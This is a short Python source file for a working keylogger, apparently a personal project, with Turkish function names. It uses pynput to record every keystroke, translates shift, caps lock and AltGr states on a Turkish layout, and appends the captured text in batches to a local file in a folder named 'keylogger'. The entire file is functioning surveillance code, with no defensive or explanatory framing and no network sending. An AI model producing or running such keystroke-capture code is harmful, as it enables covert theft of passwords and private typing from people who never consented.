from pynput.keyboard import Listener,Key
liste=list()
cpstatus=False
shstatus=False
gr_status=False

shliste = ["=","!","'","^","+","%","&","/","(",")"]
gr_list=["}",">","£","#","$","½","","{","[","]"]
number="0123456789"
def bas(key):
    global liste,cpstatus,shstatus,gr_status
    try:
     if shstatus:
        if key.char in number:
            liste.append(shliste[int(key.char)])
        else:
            if key.char =="*":
                liste.append("?")
            elif key.char=="-":
                liste.append("_")
            elif not cpstatus:
                liste.append(key.char.upper())
            else:
                liste.append(key.char)
     elif gr_status:
        if key.char in number:
            liste.append(gr_list[int(key.char)])
        else:
            if key.char == "*":
                liste.append("\\")
            elif key.char == "-":
                liste.append("|")

     elif cpstatus:
            liste.append(key.char.upper())
     else:
            liste.append(key.char)

    except AttributeError:
        if  key==Key.space:
            liste.append(" ")
        if key==Key.enter:
            liste.append("\n")
        if key==Key.backspace:
            liste.append("'<-'")
        if key==Key.caps_lock:
            cpstatus=not cpstatus
        if key==Key.shift_r or key==Key.shift_l:
            shstatus=True
        if key==Key.alt_gr:
            gr_status=True

    if len(liste) >=30:
        dosya_yaz()
        liste=list()

def birak(key):
    global shstatus,gr_status
    if key==Key.shift_r or key==Key.shift_l:
        shstatus=False
    if key == Key.alt_gr:
        gr_status = False
def dosya_yaz():
    global liste

    with open("C:/Users/zeyne/OneDrive/Desktop/keylogger/key.txt","a",encoding="utf-8") as file:
        for x in liste:
            file.write(x)

with Listener(on_press=bas,on_release=birak) as Listener:
    Listener.join()
